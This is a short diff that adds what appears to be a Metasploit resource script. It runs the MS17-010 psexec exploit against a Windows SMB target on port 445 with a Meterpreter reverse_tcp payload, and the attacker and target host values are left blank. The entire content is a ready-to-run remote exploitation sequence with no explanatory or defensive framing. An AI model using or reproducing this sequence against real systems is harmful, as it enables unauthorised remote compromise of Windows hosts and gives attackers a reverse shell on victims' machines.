@@ -1,0 +1,6 @@
+use exploit/windows/smb/ms17_010_psexec
+set payload windows/meterpreter/reverse_tcp
+set LHOST
+set RHOST 
+set RPORT 445
+run
